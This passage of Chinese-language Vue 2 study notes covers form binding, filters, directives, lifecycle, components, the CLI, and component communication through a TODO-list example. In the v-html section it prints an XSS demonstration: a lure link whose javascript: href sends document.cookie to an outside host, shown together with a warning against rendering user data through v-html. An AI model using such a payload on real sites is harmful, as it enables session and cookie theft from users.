<p>Message is: {{ message }}</p>
```

Message is:

#### [多行文本](https://v2.cn.vuejs.org/v2/guide/forms.html#多行文本)

```html
<span>Multiline message is:</span>
<p style="white-space: pre-line;">{{ message }}</p>
<br>
<textarea v-model="message" placeholder="add multiple lines"></textarea>
```

Multiline message is:





在文本区域插值 (`<textarea>{{text}}</textarea>`) 并不会生效，应用 `v-model` 来代替。

#### [复选框](https://v2.cn.vuejs.org/v2/guide/forms.html#复选框)

单个复选框，绑定到布尔值：

```html
<input type="checkbox" id="checkbox" v-model="checked">
<label for="checkbox">{{ checked }}</label>
```

 false

多个复选框，绑定到同一个数组：

```html
<input type="checkbox" id="jack" value="Jack" v-model="checkedNames">
<label for="jack">Jack</label>
<input type="checkbox" id="john" value="John" v-model="checkedNames">
<label for="john">John</label>
<input type="checkbox" id="mike" value="Mike" v-model="checkedNames">
<label for="mike">Mike</label>
<br>
<span>Checked names: {{ checkedNames }}</span>
new Vue({
  el: '...',
  data: {
    checkedNames: []
  }
})
```

 Jack John Mike
Checked names: []

#### [单选按钮](https://v2.cn.vuejs.org/v2/guide/forms.html#单选按钮)

```html
<div id="example-4">
  <input type="radio" id="one" value="One" v-model="picked">
  <label for="one">One</label>
  <br>
  <input type="radio" id="two" value="Two" v-model="picked">
  <label for="two">Two</label>
  <br>
  <span>Picked: {{ picked }}</span>
</div>
new Vue({
  el: '#example-4',
  data: {
    picked: ''
  }
})
```

 One
 Two
Picked:

#### [选择框](https://v2.cn.vuejs.org/v2/guide/forms.html#选择框)

单选时：

```
<div id="example-5">
  <select v-model="selected">
    <option disabled value="">请选择</option>
    <option>A</option>
    <option>B</option>
    <option>C</option>
  </select>
  <span>Selected: {{ selected }}</span>
</div>
new Vue({
  el: '...',
  data: {
    selected: ''
  }
})
```

请选择 A B C Selected:

如果 `v-model` 表达式的初始值未能匹配任何选项，`<select>` 元素将被渲染为“未选中”状态。在 iOS 中，这会使用户无法选择第一个选项。因为这样的情况下，iOS 不会触发 change 事件。因此，更推荐像上面这样提供一个值为空的禁用选项。

多选时 (绑定到一个数组)：

```
<div id="example-6">
  <select v-model="selected" multiple style="width: 50px;">
    <option>A</option>
    <option>B</option>
    <option>C</option>
  </select>
  <br>
  <span>Selected: {{ selected }}</span>
</div>
new Vue({
  el: '#example-6',
  data: {
    selected: []
  }
})
```

A B C
Selected: []

用 `v-for` 渲染的动态选项：

```
<select v-model="selected">
  <option v-for="option in options" v-bind:value="option.value">
    {{ option.text }}
  </option>
</select>
<span>Selected: {{ selected }}</span>
new Vue({
  el: '...',
  data: {
    selected: 'A',
    options: [
      { text: 'One', value: 'A' },
      { text: 'Two', value: 'B' },
      { text: 'Three', value: 'C' }
    ]
  }
})
```

​     One       Two       Three   Selected: A

#### [值绑定](https://v2.cn.vuejs.org/v2/guide/forms.html#值绑定)

对于单选按钮，复选框及选择框的选项，`v-model` 绑定的值通常是静态字符串 (对于复选框也可以是布尔值)：

```
<!-- 当选中时，`picked` 为字符串 "a" -->
<input type="radio" v-model="picked" value="a">

<!-- `toggle` 为 true 或 false -->
<input type="checkbox" v-model="toggle">

<!-- 当选中第一个选项时，`selected` 为字符串 "abc" -->
<select v-model="selected">
  <option value="abc">ABC</option>
</select>
```

但是有时我们可能想把值绑定到 Vue 实例的一个动态 property 上，这时可以用 `v-bind` 实现，并且这个 property 的值可以不是字符串。

#### [复选框](https://v2.cn.vuejs.org/v2/guide/forms.html#复选框-1)

```
<input
  type="checkbox"
  v-model="toggle"
  true-value="yes"
  false-value="no"
>
// 当选中时
vm.toggle === 'yes'
// 当没有选中时
vm.toggle === 'no'
```

这里的 `true-value` 和 `false-value` attribute 并不会影响输入控件的 `value` attribute，因为浏览器在提交表单时并不会包含未被选中的复选框。如果要确保表单中这两个值中的一个能够被提交，(即“yes”或“no”)，请换用单选按钮。

#### [单选按钮](https://v2.cn.vuejs.org/v2/guide/forms.html#单选按钮-1)

```
<input type="radio" v-model="pick" v-bind:value="a">
// 当选中时
vm.pick === vm.a
```

#### [选择框的选项](https://v2.cn.vuejs.org/v2/guide/forms.html#选择框的选项)

```
<select v-model="selected">
    <!-- 内联对象字面量 -->
  <option v-bind:value="{ number: 123 }">123</option>
</select>
// 当选中时
typeof vm.selected // => 'object'
vm.selected.number // => 123
```

#### [修饰符](https://v2.cn.vuejs.org/v2/guide/forms.html#修饰符)

#### [`.lazy`](https://v2.cn.vuejs.org/v2/guide/forms.html#lazy)

在默认情况下，`v-model` 在每次 `input` 事件触发后将输入框的值与数据进行同步 (除了[上述](https://v2.cn.vuejs.org/v2/guide/forms.html#vmodel-ime-tip)输入法组合文字时)。你可以添加 `lazy` 修饰符，从而转为在 `change` 事件_之后_进行同步：

```
<!-- 在“change”时而非“input”时更新 -->
<input v-model.lazy="msg">
```

#### [`.number`](https://v2.cn.vuejs.org/v2/guide/forms.html#number)

如果想自动将用户的输入值转为数值类型，可以给 `v-model` 添加 `number` 修饰符：

```
<input v-model.number="age" type="number">
```

这通常很有用，因为即使在 `type="number"` 时，HTML 输入元素的值也总会返回字符串。如果这个值无法被 `parseFloat()` 解析，则会返回原始的值。

#### [`.trim`](https://v2.cn.vuejs.org/v2/guide/forms.html#trim)

如果要自动过滤用户输入的首尾空白字符，可以给 `v-model` 添加 `trim` 修饰符：

```
<input v-model.trim="msg">
```

![image-20221025203052851](E:\typora\homework\img\vue\image-20221025203052851.png)

### 1.17过滤器

Vue.js 允许你自定义过滤器，可被用于一些常见的文本格式化。过滤器可以用在两个地方：**双花括号插值和 `v-bind` 表达式** (后者从 2.1.0+ 开始支持)。过滤器应该被添加在 JavaScript 表达式的尾部，由“管道”符号指示：

```html
<!-- 在双花括号中 -->
{{ message | capitalize }}

<!-- 在 `v-bind` 中 -->
<div v-bind:id="rawId | formatId"></div>
```

你可以在一个组件的选项中定义本地的过滤器：

```js
filters: {
  capitalize: function (value) {
    if (!value) return ''
    value = value.toString()
    return value.charAt(0).toUpperCase() + value.slice(1)
  }
}
```

或者在创建 Vue 实例之前全局定义过滤器：

```js
Vue.filter('capitalize', function (value) {
  if (!value) return ''
  value = value.toString()
  return value.charAt(0).toUpperCase() + value.slice(1)
})

new Vue({
  // ...
})
```

当全局过滤器和局部过滤器重名时，会采用局部过滤器。

下面这个例子用到了 `capitalize` 过滤器：

John

过滤器函数总接收表达式的值 (之前的操作链的结果) 作为第一个参数。在上述例子中，`capitalize` 过滤器函数将会收到 `message` 的值作为第一个参数。

过滤器可以串联：

```html
{{ message | filterA | filterB }}
```

在这个例子中，`filterA` 被定义为接收单个参数的过滤器函数，表达式 `message` 的值将作为参数传入到函数中。然后继续调用同样被定义为接收单个参数的过滤器函数 `filterB`，将 `filterA` 的结果传递到 `filterB` 中。

过滤器是 JavaScript 函数，因此可以接收参数：

```html
{{ message | filterA('arg1', arg2) }}
```

这里，`filterA` 被定义为接收三个参数的过滤器函数。其中 `message` 的值作为第一个参数，普通字符串 `'arg1'` 作为第二个参数，表达式 `arg2` 的值作为第三个参数。



****

案例

```html
<body>
    <div id='app'>
        <!-- 第一个是值 过滤器 -->
        <h3>{{time | timeFormater}}</h3><br>
        <h3>{{time | timeFormater('YYYY-MM-DD')}}</h3><br>
        <!-- 一个数据可以配置多个过滤器 按照顺序进行处理数据 -->
        <h3>{{time | timeFormater('YYYY-MM-DD') | mySlice}}</h3><br>

        <h3>{{time | timeFormater('YYYY-MM-DD') | mySlice | addtion}}</h3>
    </div>
    <script src='../vue.js'></script>
    <script src="https://unpkg.com/dayjs@1.8.21/dayjs.min.js"></script>
    <script>
        // 配置一个全局的过滤器 如果有多个vue实例都可以使用这个过滤器
        Vue.filter('addtion',function(value){
            return value+'真是一个大帅比';
        })
    var vm =new Vue({
    el:'#app',
    data:{
       time:1318781876406
    },
    methods: {
        // /dayjs(1318781876406).format('YYYY-MM-DD HH:mm:ss');   // 2011-10-17 00:17:56
    },
    // vue实例中的过滤器是局部的只能在vue实例中使用
    filters:{
        // 配置一个过滤器第一个是值 第二个是过滤器的参数
        // ES6 新增语法默认值 如果参数有值 用传来的参数 没有值用默认的
        timeFormater(value,str='YYYY-MM-DD HH:mm:ss'){
            return dayjs(value).format(str)
        },
        mySlice(value){
            return value.slice(0,4);
        }
    }
    })
    </script>
</body>
```

过滤器在页面上的效果

![image-20221026203828484](E:\typora\homework\img\vue\image-20221026203828484.png)

总结

![image-20221026203752683](E:\typora\homework\img\vue\image-20221026203752683.png)

### 1.18 vue内置指令



#### 1.18.1 v-text指令

```html
<body>
    <div id='app'>
        <!-- v-text 会替换标签中的文字 -->
        <h3 v-text="name">11</h3>
    </div>
    <script src='../vue.js'></script>
    <script>
    var vm =new Vue({
    el:'#app',
    data:{  
        name:'是一个大帅比'
    },
    methods: {
    }
    })
    </script>
</body>
```

#### 1.18.2 v-html指令

v-html指令可以 解析字符串中的html标签显示在页面上

但是可能导致xss攻击 把用户的cookie发送到其他服务器,不能在用户提交的数据中使用v-html

```html
<body>
    <div id='app'>
        <h3  v-html='name'>11</h3>
    </div>
    <script src='../vue.js'></script>
    <script>
    var vm =new Vue({
    el:'#app',
    data:{  
        name:'<a href=javascript:location.href="http://www.baidu.com?"+doucment.cookie  >点我看片</a>'
    }
    })
    </script>
</body>
```

![image-20221026211011600](E:\typora\homework\img\vue\image-20221026211011600.png)

#### 1.18.3 v-cloak 指令

在vue加载后vue会自动删除元素上的v-cloak属性

```html
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        [v-cloak]{
            display: none;
        }
    </style>
</head>
<body>

    <div id='app'>
        <!-- v-cloak属性配合CSS可以让vue加载完毕后再显示元素 v-claok在vue加载后会自动删除 -->
        <h2 v-cloak>{{name}}</h2>
    </div>
    <script src='../vue.js'></script>
    <script>
    var vm =new Vue({
    el:'#app',
    data:{  
        name:'大帅哥'
    },
    methods: {
    }
    })
    </script>
</body>
```

![image-20221028150822591](E:\typora\homework\img\vue\image-20221028150822591.png)

#### 1.18.4 [v-once](https://v2.cn.vuejs.org/v2/api/#v-once)

- **不需要表达式**

- **详细**：

  只渲染元素和组件**一次**。随后的重新渲染，元素/组件及其所有的子节点将被视为静态内容并跳过。这可以用于优化更新性能。

  ```html
  <!-- 单个元素 -->
  <span v-once>This will never change: {{msg}}</span>
  <!-- 有子元素 -->
  <div v-once>
    <h1>comment</h1>
    <p>{{msg}}</p>
  </div>
  ```

![image-20221028151523265](E:\typora\homework\img\vue\image-20221028151523265.png)

#### 1.18.5 [v-pre](https://v2.cn.vuejs.org/v2/api/#v-pre)

- **不需要表达式**

- **用法**：

  跳过这个元素和它的子元素的编译过程。可以用来显示原始 Mustache 标签。跳过大量没有指令的节点会加快编译。

- **示例**：

  ```
  <span v-pre>{{ this will not be compiled }}</span>
  ```

![image-20221028151344291](E:\typora\homework\img\vue\image-20221028151344291.png)

### 1.19 自定义指令

#### 1.19.2函数式自定义指令

```html
<body>
    <div id='app'>
        <h2>{{name}}</h2>
        <h2 v-big="number"></h2>
        <button @click="number++">点一下</button>
    </div>
    <script src='../vue.js'></script>
    <script>
    var vm =new Vue({
    el:'#app',
    data:{  
        number:10,
        name:"大帅哥"
    },
    methods: {
    },
    directives:{
        // 第一个参数为真实的document元素
        // 第二个参数为 元素所绑定属性值 有标签内的表达式 和data中的具体值

        // 自定义指令会在页面加载时执行一次 
        // 自定义指令在vm元素重新解析时也会重新执行
        big(element,binding){
            console.log('big自定义标签被调用了');
            element.innerHTML=binding.value*10
        }
    }
    })
    </script>
</body>
```

![image-20221028154806033](E:\typora\homework\img\vue\image-20221028154806033.png)

不仅在绑定的元素发生变化时 重新执行自定义指令。在vue模板页面解析其他元素时也会重新执行自定义指令

![image-20221028154832793](E:\typora\homework\img\vue\image-20221028154832793.png)

#### 1.19.3 对象型式自定义指令

使用函数时相当于默认只会执行 bind 和update函数 不能立即使用focus()函数来获取焦点。

因为focus()需要在元素已经存在在真实的document中。还有比如需要父元素 也要已经存在于页面上面，执行才有有效果。

```html
<body>
    <div id='app'>
        <input type="text" v-fbind:input='number'><br>
        <button @click='number++'>增加</button>
    </div>
    <script src='../vue.js'></script>
    <script>
    var vm =new Vue({
    el:'#app',
    data:{  
        number:1
    },
    methods: {
    },
    directives:{
        fbind:{
            // 指令与元素成功绑定的时候 (一上来)
            bind(element,binding){
                element.value = binding.value*10
            },
            // 指令所在的元素被插入在页面上时
            inserted(element,binding){
                // 获取焦点
                element.focus()
            },
            // 指令所在的模板被重新解析时
            update(element,binding){
                element.value = binding.value*10
            }
        }
    }
    })
    </script>
</body>
```

![image-20221028165658321](E:\typora\homework\img\vue\image-20221028165658321.png)

在自定的指令中this的指向是window 不再是vue



定义一个全局的自定义指令

```html
// 注册一个全局自定义指令 `v-focus`
Vue.directive('focus', {
  // 当被绑定的元素插入到 DOM 中时……
  inserted: function (el) {
    // 聚焦元素
    el.focus()
  }
})
```

总结

![image-20221028164606430](E:\typora\homework\img\vue\image-20221028164606430.png)

### 1.20 Vue生命周期

#### 1.20.1初识生命周期函数

```html
<body>
    <div id='app'>
        <h2 :style='{opacity: opacity}'>闪动</h2>
    </div>
    <script src='../vue.js'></script>
    <script>
    var vm =new Vue({
    el:'#app',
    data:{  
        opacity:1
    },
    methods: {
    },
    // mounted 函数vue在真实dom初始化完成时 只调用一次
    mounted() {
        // mounted 中this指向为 vue实例
        console.log(this);
        // 开启一个定时器
        setInterval(() => {
            this.opacity-=0.01;
            if(this.opacity<=0.1)this.opacity=1;
        }, 20);
    }
    })
    </script>
</body>
```



![image-20221029153138539](E:\typora\homework\img\vue\image-20221029153138539.png)

![image-20221029153037115](E:\typora\homework\img\vue\image-20221029153037115.png)

#### 1.20.2 vue生命周期 挂载流程

![生命周期vue](E:\typora\homework\img\vue\生命周期vue.jpg)

#### 1.20.3 vue生命周期 更新流程

![image-20221029165717446](E:\typora\homework\img\vue\image-20221029165717446.png)

#### 1.20.4 vue 生命周期 销毁流程

调用 vm.$destory() 来销毁vm实例对象

- **用法**：

  完全销毁一个vm实例。清理它与其它实例的连接，解绑它的全部指令及自定义事件监听器。

  触发 `beforeDestroy` 和 `destroyed` 的钩子。

  在大多数场景中你不应该调用这个方法。最好使用 `v-if` 和 `v-for` 指令以数据驱动的方式控制子组件的生命周期。

![image-20221031234417218](E:\typora\homework\img\vue\image-20221031234417218.png)

#### 1.20.5 生命周期总结

![生命周期vue(1)](E:\typora\homework\img\vue\生命周期vue(1).jpg)

![image-20221101000845996](E:\typora\homework\img\vue\image-20221101000845996.png)

## 第二章 vue组件化编程

### 2.1模块与组件 模块化与组件化

![image-20221105230248200](E:\typora\homework\img\vue\image-20221105230248200.png)





![image-20221105230304569](E:\typora\homework\img\vue\image-20221105230304569.png)

模块:复用js 简化js的编写，提高js的运行效率

组件:用来实现局部特定功能效果的代码集合，复用编码，简化项目编码，提高运行效率

### 2.2非单文件组件

非单文件组件：一个文件中包含有多个组件

单文件组件：一个文件中只有一个组件

#### 2.2.2为什么vue组件中的data数据只能写成函数形式而不能写成对象形式

直接写成对象形式

![image-20221105234233872](E:\typora\homework\img\vue\image-20221105234233872.png)

![image-20221105234221766](E:\typora\homework\img\vue\image-20221105234221766.png)



通过函数形式返回值返回一个对象

![image-20221105233955533](E:\typora\homework\img\vue\image-20221105233955533.png)

![image-20221105233934201](E:\typora\homework\img\vue\image-20221105233934201.png)

#### 2.2.3非单位件组件

```html
<body>
    <div id='app'>
        <school> <school/>
        <student><student/>
    </div>
    <script src='../vue.js'></script>
    <script>
        const schoolComponent = Vue.extend({
            template:`
            <div>
            <h2>{{schoolName}}</h2>
             <h2>{{schoolAddress}}</h2>
            </div>
            `,
            data() {
                return {
                    schoolName:'帅比大学',
                    schoolAddress:'地上'
                }
            },
        })

        const studentComponent = Vue.extend({
            template:`
            <div>
            <h2>{{studentName}}</h2>
             <h2>{{studentAge}}</h2>
            </div>
            `,
            data() {
                return {
                    studentName:'帅比',
                    studentAge:21
                }
            },
        })
        const hello =Vue.extend({
            template:`
            <div>
            <h2>你好</h2>
             <h2>{{name}}</h2>
            </div>
            `,
            data() {
                return {
                    name:'帅帅明'
                }
            },
        })
        // Vue全局注册组件
        Vue.component('hello',hello)
        var vm =new Vue({
        el:'#app',
        data:{  
        },
        methods: {
        },
        // 组件局部注册
        components:{
            school:schoolComponent,
            student:studentComponent

        }
        })

    </script>
</body>
```

![image-20221109203027380](E:\typora\homework\img\vue\image-20221109203027380.png)

#### 2.2.4组件的注意事项

![image-20221109204358860](E:\typora\homework\img\vue\image-20221109204358860.png)

#### 2.2.5组件的嵌套

```html
<body>
    <div id='app'>

    </div>
    <script src='../vue.js'></script>
    <script>
        const schoolComponent = Vue.extend({
            template:`
            <div>
            <h2>{{schoolName}}</h2>
             <h2>{{schoolAddress}}</h2>
            </div>
            `,
            data() {
                return {
                    schoolName:'帅比大学',
                    schoolAddress:'地上'
                }
            },
        })

        const studentComponent = Vue.extend({
            template:`
            <div>
            <h2>{{studentName}}</h2>
             <h2>{{studentAge}}</h2>
            </div>
            `,
            data() {
                return {
                    studentName:'帅比',
                    studentAge:21
                }
            },
        })
        const hello =Vue.extend({
            template:`
            <div>
            <h2>你好</h2>
             <h2>{{name}}</h2>
            </div>
            `,
            data() {
                return {
                    name:'帅帅明'
                }
            },
        })
        // 用app组件管理其他的组件
        const app = Vue.extend({
            template:
            `<div>
                    <hello></hello>
                    <school></school>
                    <student></student>
                </div>`,
            components:{
                hello,
                school:schoolComponent,
                student:studentComponent

            }
        })
        var vm =new Vue({
        template:`<app></app>`,
        el:'#app',
        data:{  
        },
        methods: {
        },
        // 组件局部注册
        components:{
            app
        }
        })

    </script>
</body>
```

![image-20221109210655697](E:\typora\homework\img\vue\image-20221109210655697.png)

#### 2.2.6VueComponent原理分析

```js
      Vue.extend = function (extendOptions) {
			/**----------**/
          // 每次执行extend都会使用Vuecomponent构造函数来返回一个新的component
          var Sub = function VueComponent(options) {
              this._init(options);
          };
			/**------------------**/
          return Sub;
      };
```

![image-20221111211116285](E:\typora\homework\img\vue\image-20221111211116285.png)

vm实例对象管理着vueComponent这些组件对象 管理的这些组件对象都在children

![image-20221111212344508](E:\typora\homework\img\vue\image-20221111212344508.png)

### 2.3单文件组件

**单文件组件的结构形式**

```vue
<template>
      <!-- 组件结构 -->
    <div >
        <div class="demo">
            <h2>{{schoolName}}</h2>
            <h2>{{schoolAddress}}</h2>
        </div>
    </div>
</template>

<script>
    // 组件交互相关的代码 数据方法等
    // 默认暴露
    // vue.extend可以省略
    export default {
        name:'School',
        data() {
                return {
                    schoolName:'帅比大学',
                    schoolAddress:'地上'
                }
            }
    }
</script>

<style>
    .demo{
        background-color: red;
    }
    /* 组件的样式 */
</style>

```

## 第三章  vue脚手架的使用

**安装并且创建一个vue项目**

```
npm install -g @vue/cli

vue create my-project
```

![image-20221114151946144](E:\typora\homework\img\vue\image-20221114151946144.png)

创建完成后运行这两个命令启动vue项目

![image-20221114152814286](E:\typora\homework\img\vue\image-20221114152814286.png)

![image-20221114152857635](E:\typora\homework\img\vue\image-20221114152857635.png)



### 3.1脚手架的项目结构

![image-20221114153801468](E:\typora\homework\img\vue\image-20221114153801468.png)





![image-20221114153929266](E:\typora\homework\img\vue\image-20221114153929266.png)



**main.js是整个项目文件的入口文件**

![image-20221114155913812](E:\typora\homework\img\vue\image-20221114155913812.png)

**项目启动成功**

![image-20221114212727361](E:\typora\homework\img\vue\image-20221114212727361.png)

从vue开发者工具中可以看到我们的组件

![image-20221114212802635](E:\typora\homework\img\vue\image-20221114212802635.png)

main.js中render模板渲染函数非简写的方式

render模板渲染 其实是一个语法糖

![image-20221114213619239](E:\typora\homework\img\vue\image-20221114213619239.png)

![image-20221114211134709](E:\typora\homework\img\vue\image-20221114211134709.png)

### 3.2 ref属性使用

ref属性用来获取真实的DOM元素

![image-20221115132604740](E:\typora\homework\img\vue\image-20221115132604740.png)

![image-20221115132103030](E:\typora\homework\img\vue\image-20221115132103030.png)

标签中添加了ref属性的元素会存放在组件的$refs这个属性中

![image-20221115132422125](E:\typora\homework\img\vue\image-20221115132422125.png)

### 3.3 props配置项

**数据传递**

使用v-bind把字符串中的值当做表达式计算后返回结果

普通属性中的值视为字符串

![image-20221115135003675](E:\typora\homework\img\vue\image-20221115135003675.png)

**数据接收**

```js
        // props:['age','sex']  简单接受的


        // 接收同时进行 数据类型的限制
        props:{
            age:Number,
            sex:String
        }

        // 接收数据同时队数据进行类型限制+默认值得指定+必要性的限制
        props:{
            name:{
                type:String,
                required:true
            },
            age:{
                type:Number,
                default:16
            }
        }
```

在模板中使用和正常数据项一样

![image-20221115135138814](E:\typora\homework\img\vue\image-20221115135138814.png)



**总结**

![image-20221115140042337](E:\typora\homework\img\vue\image-20221115140042337.png)

props中的优先级比data的优先级更高，当数据项中存在与props中冲突的字段时，会保留props中的数据

### 3.4mixin混入

多个组件之前可以复用的数据可以使用混合

复用的代码单独定义在js中

![image-20221115150735003](E:\typora\homework\img\vue\image-20221115150735003.png)

在组件中引入混合项

![image-20221115150827510](E:\typora\homework\img\vue\image-20221115150827510.png)

#### 3.4.2全局混合

混合的数据所有的组件和vm身上都有

```js
import {mixin_2} from './mixin.js'


Vue.mixin(mixin_2)
```

全局混入到所有组件身上

![image-20221115152108739](E:\typora\homework\img\vue\image-20221115152108739.png)

![image-20221115152127180](E:\typora\homework\img\vue\image-20221115152127180.png)

![image-20221115152035171](E:\typora\homework\img\vue\image-20221115152035171.png)

### 3.5vue 插件的使用

![image-20221115153806928](E:\typora\homework\img\vue\image-20221115153806928.png)



在插件中配置一个过滤器

```js
//过滤器插件
export default {
    install(Vue){
        console.log('1111')
        // 配置一个全局的过滤器 如果有多个vue实例都可以使用这个过滤器
        Vue.filter('addtion',function(value){
            return value+'真是一个大帅比';
        })
    }
}
```

在main.js文件中引入并且使用这个插件

![image-20221115154854722](E:\typora\homework\img\vue\image-20221115154854722.png)

### 3.6 scoped样式

让样式在局部生效防止冲突

```css
<style scoped>
    .demo{
        background-color: blue;
    }
    /* 组件的样式 */
</style>
```

通过添加一个随机值的序列来保证不冲突

![image-20221115161015219](E:\typora\homework\img\vue\image-20221115161015219.png)





### 3.7 组件化TODOlist案例



#### 3.7.1 页面中组件的划分

分成以下几个组件

![image-20221116165044007](E:\typora\homework\img\vue\image-20221116165044007.png)

![image-20221116165154266](E:\typora\homework\img\vue\image-20221116165154266.png)

#### 3.7.2  各个组件的具体代码

**头部代码**

```vue
<template>
    <div>       
        <div class="todo-header">
            <input type="text" placeholder="请输入你的任务名称，按回车键确认" @keyup.enter="add"/>
         </div>
   </div>
</template>

<script>
    // 生成唯一id的插件
    import {nanoid} from 'nanoid'
    export default {
        name:'HeaderComponent',
        methods: {
            add(event){
                console.log(event.target.value);
                let todo ={
                    id:nanoid(),
                    title:event.target.value,
                    isFinish:false
                }
                // 把新添加的 todo对象交给 父组件App 
                this.addtodo(todo);
                console.log(todo);
            }
        },
        // 通过props 方式将父组件的函数交给子组件
        props:['addtodo']
    }
</script>
```

**列表**

```vue
<template>
    <div>      
        <ul class="todo-main">
            <EachComponent v-for="todo in todos" :key='todo.id'
             v-bind:todo='todo'
             v-bind:alterCheck='alterCheck'
             v-bind:todoDelete='todoDelete'></EachComponent>

      </ul>
    </div>
       
</template>

<script>
    import EachComponent from './EachComponent.vue';
    export default {
        name:'ListComponent',
        components:{
            EachComponent
        },
        // 中转数据交给每个列表元素
        props:['todos','alterCheck','todoDelete']
        
    }
</script>
```

**列表中每一个元素项**

```vue
<template>
    <div>
        <li>
            <label>
              <input type="checkbox" v-bind:checked='todo.isFinish' @change="handleCheck(todo.id)"/>
              <span>{{todo.title}}</span>
            </label>

            <button class="btn btn-danger" style="" 
            @click='handleDelete(todo.id)'>删除</button>
            <!-- 用父组件的handleDelete函数 -->
          </li>
   </div>
</template>

<script>
export default {
    name:'EachComponent',
    props:['todo','alterCheck','todoDelete'],
    methods: {
        handleCheck(id){
            // 调用App身上的alterCheck
            this.alterCheck(id);
        },
        handleDelete(id){
            if(!confirm('确定删除么!')) return;
            this.todoDelete(id);
        }

    },  

    
}
</script>
```

**脚部**

```vue
<template>
    <div>  
        <div class="todo-footer" v-show='todos.length'>
            <label>
              <input type="checkbox" v-bind:checked="isAll" @click='changeAll'/>
            </label>
            <span>
              <span>已完成{{finishedTodos}}</span> / 全部{{todos.length}}
            </span>
            <button class="btn btn-danger" @click='delteFinished'>清除已完成任务</button>
          </div>
   </div>
</template>

<script>
    export default {
        name:'FooterComponent',
        // data() {
        //   return {
        //     myTodos:this.todos
        //   }
        // },
        methods: {
          // 改变所有事项的状态
          changeAll(event){
            console.log(event.target.checked);
              this.todos.forEach(todo => {
                if(event.target.checked) todo.isFinish=true;
                else todo.isFinish=false;
              });
            
          },
          // 删除所有已经完成的事项
          delteFinished(){
            if(!confirm('确定删除已完成的么!')) return;
             this.todos.forEach(todo => {
              console.log(todo);
              if(todo.isFinish) this.todoDelete(todo.id);              
             });
          }
        },
        computed:{
          // 使用计算属性统计已完成的数量
          finishedTodos(){
           return this.todos.filter(todo=>{
              return todo.isFinish
            }).length
          },
          // 所有的代办事项
          isAll(){
            console.log(this.finishedTodos,this.todos.length);
           if(this.finishedTodos==0) return false;
           return this.finishedTodos == this.todos.length;
          }
        },
        props:['todos','todoDelete']
        
    }
</script>
```

#### 3.7.3 浏览器本地存储

**存储**

```js
        watch:{
            todos:{
                deep:true,
                // 存储数据到本地浏览器中
                handler(){
                    // 第一个参数是key值 第二个参数是value值 且只能存为字符串
                    localStorage.setItem('todos',JSON.stringify(this.todos))
                }
            }
        },
```

**读取**

读取到的值是一个字符串 使用JSON.parse转成对象

```js
   todos:JSON.parse(localStorage.getItem('todos'))||[]
```

![image-20221116163917817](E:\typora\homework\img\vue\image-20221116163917817.png)



### 3.8使用自定义事件来发送数据给父组件

#### 3.8.1第一种写法

```html
    <!-- 给子组件定义一个seeNeed的自定义事件 -->
        <SchoolComponent v-on:seeNeed='test'></SchoolComponent>
```

**在子组件中使用自定义事件来携带参数**

```js
    methods: {
        clickOnce(){
            // 触发SchoolComponent身上的事件
            this.$emit('seeNeed',this.name);
        }
    },
```

**父组件中事件所绑定的方法就可以接收到这个参数了**

```js
        methods: {
            test(name){
                console.log("App收到了名字",name);
            }
        },
```

#### 3.8.2第二种写法

```html
        <!-- 通过ref来获取组件实例对象 -->
        <SchoolComponent ref="school"></SchoolComponent>
```

通过拿到组件的实例对象来自定义事件 通过回调函数拿到返回值

```js
        mounted() {
            this.$refs.school.$on('seeNeed',this.test)
        },
```

#### 3.8.3 解绑事件

```js
//解绑一个事件
this.$off('seeNeed')

//解绑多个事件
this.$off(['seeNeed','lookNeed'])
```

#### 3.8.4 vue2绑定原生document事件

```html
        <!-- 给组件绑定原生的docm事件 -->
       <TypeNavRouter @mouseenter.native="enter" @mouseleave.native="leave"></TypeNavRouter>
```



### 3.9全局事件总线

![image-20221117161949354](E:\typora\homework\img\vue\image-20221117161949354.png)

**原理:**

在组件实例对象中调用this.***时候 会先在组件实例对象身上找 

如果找不到会去VueComponent原型对象身上找

如果还找不到就会去Vue原型对象身上找

这样我们就可以利用Vue原型 和Vue实例对象来 做一个全局的组件间的通信中间人,我们起名叫做$bus

![image-20221117162017743](E:\typora\homework\img\vue\image-20221117162017743.png)



**全局总线的具体实现代码**

在new Vue时安装

```js
new Vue({

  render: h => h(App),
    
  // 在vue创建之前
  beforeCreate() {
      // 安装全局事件总线 全局Vue上放一个vue的实例对象
      Vue.prototype.$bus = this
  }

}).$mount('#app')

```



**在需要接收数据的组件实例上定义一个自定义事件来接收数据**

```js
<script>
export default {
    name:'SchoolComponent',
    data() {
        return {
            name:'大明明',
            address:'天山',
            studentName:''
        }
    },
    // 组件挂载完成
    mounted() {
        // 定义一个自定义事件用来接收 数据
        this.$bus.$on('receive',(studentName)=>{
            console.log('school收到',studentName);
            this.studentName=studentName;
        })
    },
}
</script>
```



**在数据发送方组件实例上来触发**

```js
export default {
    name:'StudentComponent',
    data() {
        return {
            name:'一个强大的数据'
        }
    },
    methods: {
        clickOnce(){
            // 触发事件 来发送数据
            this.$bus.$emit('receive',this.name);
        }
    },
}
</script>
```



**至此任意间组件可以通过这种方式 进行数据通信**

![image-20221117162743955](E:\typora\homework\img\vue\image-20221117162743955.png)

### 3.10消息订阅与发布

使用`pubsub-js`实现

在`SchoolComponent`组件中订阅消息

```js
    import pubsub from 'pubsub-js'
export default {
    name:'SchoolComponent',
    
    // 组件挂载完成 时来订阅一个消息
    mounted() {
        // 订阅消息返回一个ID标识用来销毁这个消息
        this.pubId = pubsub.subscribe('hello', (msgName,data)=> {
            alert('订阅了一个hello',msgName,data)
        })
    },
    // 销毁之前取消订阅
    beforeDestroy() {
        pubsub.unsubscribe(this.pubId);
    },
```

在`StudentComponent`组件中发布一条消息

```js
      import pubsub from 'pubsub-js'
export default {
    name:'StudentComponent',
    methods: {
        clickOnce(){
            // 发布消息
            pubsub.publish('hello','这是什么大帅哥');
        }
    },
```



![image-20221117213642006](E:\typora\homework\img\vue\image-20221117213642006.png)



![image-20221117213324781](E:\typora\homework\img\vue\image-20221117213324781.png)



### 3.11 使用$nextTick 实现todoList的编辑功能

官方描述:

​	在下次DOM更新循环结束之后执行延迟回调。在修改数据之后立即使用这个方法，获取更新后的DOM。



```html
//修改html页面//
<template>
    <div>
        <li>
            <label>
              <input type="checkbox" v-show='!todo.isEdit' 
              v-bind:checked='todo.isFinish'
               @change="handleCheck(todo.id)"/>
              <span v-show='!todo.isEdit'>{{todo.title}}</span>
              <!-- 编辑框 框内的值就是todo.title -->
              <input type="text" v-show='todo.isEdit' 
